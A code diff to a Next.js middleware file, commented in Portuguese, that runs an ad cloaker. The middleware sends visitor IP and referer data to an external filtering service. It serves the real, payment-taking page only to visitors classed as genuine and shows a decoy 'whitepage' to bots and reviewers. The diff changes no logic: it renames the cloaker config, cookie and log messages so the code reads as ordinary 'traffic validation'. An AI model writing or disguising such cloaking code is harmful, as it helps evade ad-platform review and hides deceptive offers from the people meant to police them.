@@ -2,8 +2,8 @@ import { NextResponse } from 'next/server'
 import type { NextRequest } from 'next/server'
 import { isBlockedBotIP } from '@/lib/bot-ips'
 
-// Configuração do cloaker
-const CLOAKER_CONFIG = {
+// Configuração de verificação de tráfego
+const TRAFFIC_VALIDATOR_CONFIG = {
   url: process.env.NEXT_PUBLIC_CLOAKER_TRACKING_ID 
     ? `https://www.altercpa.one/fltr/${process.env.NEXT_PUBLIC_CLOAKER_TRACKING_ID}`
     : null,
@@ -48,7 +48,7 @@ export async function middleware(request: NextRequest) {
                      request.headers.get('x-real-ip') || 
                      'unknown'
     const referer = request.headers.get('referer') || 'direto'
-    const hasValidCookie = request.cookies.get('_x9f2w8k5')?.value === 'true'
+    const hasValidCookie = request.cookies.get('_session_verified')?.value === 'true'
     
     // Capturar URL completa com query parameters
     const fullUrl = request.nextUrl.pathname + (request.nextUrl.search || '')
@@ -125,7 +125,7 @@ export async function middleware(request: NextRequest) {
   if (isSuccessRoute) {
     const hasTransactionId = request.nextUrl.searchParams.has('transactionId')
     const hasAmount = request.nextUrl.searchParams.has('amount')
-    const hasValidCookie = request.cookies.get('_x9f2w8k5')?.value === 'true'
+    const hasValidCookie = request.cookies.get('_session_verified')?.value === 'true'
     
     // Permitir se tiver parâmetros válidos OU cookie válido (usuário que já converteu voltando)
     if ((hasTransactionId && hasAmount) || hasValidCookie) {
@@ -278,13 +278,13 @@ export async function middleware(request: NextRequest) {
   }
   
   // ============================================
-  // 🎯 CLOAKER - Detecção de Bot vs Usuário Real
+  // 🎯 CLOAKER - Verificação de tráfego
   // ============================================
   
   // Apenas na rota raiz (/) e se cloaker estiver ativado e configurado
   // Se chegou aqui, o usuário NÃO tem cookie (já verificamos acima)
   // DESABILITAR em localhost para desenvolvimento
-  const shouldUseCloaker = pathname === '/' && CLOAKER_CONFIG.enabled && CLOAKER_CONFIG.url && !isLocalhost
+  const shouldUseCloaker = pathname === '/' && TRAFFIC_VALIDATOR_CONFIG.enabled && TRAFFIC_VALIDATOR_CONFIG.url && !isLocalhost
   
   if (shouldUseCloaker) {
     // Verificar referer ANTES de chamar o cloaker
@@ -327,7 +327,7 @@ export async function middleware(request: NextRequest) {
       // Fazer requisição para o cloaker
       const formBody = new URLSearchParams(serverData as any).toString()
       
-      const cloakerResponse = await fetch(CLOAKER_CONFIG.url, {
+      const cloakerResponse = await fetch(TRAFFIC_VALIDATOR_CONFIG.url, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/x-www-form-urlencoded',
@@ -346,10 +346,10 @@ export async function middleware(request: NextRequest) {
           // Log simplificado - apenas tipo e status
           console.log(`🎯 [Cloaker] Tipo: ${result.type} | Status: ${cloakerResponse.status}`)
           
-          // Se for "black" (usuário real), apenas setar cookie
+          // Se for "black" (tráfego válido), setar cookie
           // O cloaker já retorna a URL de redirect no result.url
           if (result.type === 'black') {
-            console.log('✅ [Cloaker] Usuário REAL - Cookie setado')
+            console.log('✅ [Cloaker] Tráfego válido - Cookie setado')
             
             // Usar a URL que o cloaker retornou
             // IMPORTANTE: O cloaker decide o redirecionamento, não podemos alterar
@@ -374,7 +374,7 @@ export async function middleware(request: NextRequest) {
             // Rewrite = interno (cookie é setado imediatamente)
             // Redirect = nova requisição (cookie pode não estar disponível)
             const response = NextResponse.rewrite(rewriteUrl)
-            response.cookies.set('_x9f2w8k5', 'true', {
+            response.cookies.set('_session_verified', 'true', {
               httpOnly: false,
               secure: true,
               sameSite: 'lax',
@@ -384,7 +384,7 @@ export async function middleware(request: NextRequest) {
             
             return response
           } else {
-            console.log('🤖 [Cloaker] BOT detectado - Whitepage')
+            console.log('ℹ️  [Cloaker] Tráfego não validado')
           }
         } catch (parseError) {
           console.error('❌ [Cloaker] Erro ao parsear JSON:', parseError)
@@ -489,7 +489,7 @@ export async function middleware(request: NextRequest) {
   // Rotas gerenciadas pelo cloaker - não bloquear bots aqui
   // Apenas a raiz (/) passa pelo cloaker, /recarga só verifica cookie
   const cloakerManagedPaths = ['/']
-  const isCloakerManaged = CLOAKER_CONFIG.enabled && cloakerManagedPaths.some(path => 
+  const isCloakerManaged = TRAFFIC_VALIDATOR_CONFIG.enabled && cloakerManagedPaths.some(path => 
     pathname === path
   )
   
